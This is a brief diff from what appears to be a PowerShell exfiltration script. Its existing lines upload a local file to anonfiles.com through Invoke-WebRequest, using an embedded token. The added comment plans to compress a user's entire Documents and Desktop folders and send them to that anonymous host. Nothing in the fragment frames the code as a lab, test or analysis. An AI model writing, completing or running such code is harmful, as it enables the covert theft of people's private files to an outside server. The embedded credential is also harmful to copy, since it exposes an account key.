@@ -7,3 +7,5 @@ $url = https://api.anonfiles.com/upload?token=6e578f0f3525bf07
 $r = Invoke-WebRequest -url $url -Method Put -Infile $datapath
  
  print "$r.Content"
+ 
+ #I still need some way to kompress the whole "Dokumekte" and "Desktop" folder so I can send them to anonfiles wich has a limitation of 3gb.
